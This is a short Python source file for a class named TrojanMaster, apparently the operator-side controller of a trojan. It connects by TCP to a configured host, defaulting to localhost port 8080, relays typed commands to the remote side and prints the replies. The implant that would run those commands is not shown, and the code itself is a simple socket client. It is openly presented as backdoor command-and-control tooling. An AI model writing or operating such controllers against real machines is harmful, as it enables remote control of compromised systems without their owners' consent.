import socket, sys, threading


class TrojanMaster(threading.Thread):
    def __init__(self, conf_dict):
        threading.Thread.__init__(self)
        self.conf_dict = conf_dict
        self.int_buff = 1024
        self.target_host = conf_dict["target_host"]
        self.target_port = conf_dict["target_port"]
        self.received_message = None
        try:
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.connection.connect((self.target_host, self.target_port))
            print("Connection established with %s:%d" % (self.target_host, self.target_port))
        except socket.error as e:
            print("Connection failed with error %s" % e)


    def send_message(self, message=None):
        self.connection.sendto(message.encode(), (self.target_host, self.target_port))
        print("sent message: ", message)

    def receive_message(self):
        self.received_message = self.connection.recv(self.int_buff)
        print("received message: ", self.received_message.decode())
        return self.received_message.decode()

    def trojan_logic(self):
        while True:
            print("Enter command")
            command = input(">>> ")
            if command == "":
                print("Enter command string")
            elif command == "exit":
                self.send_message(command)
                self.close()
                break
            else:
                self.send_message(command)
                print(self.receive_message())


    def run(self):
        self.trojan_logic()

    def close(self):
        self.connection.close()

def main():
    conf_dict = {"target_host": "127.0.0.1", "target_port": 8080}
    master_instance = TrojanMaster(conf_dict)
    master_instance.run()

if __name__ == '__main__':
    error_code = main()
    sys.exit(error_code)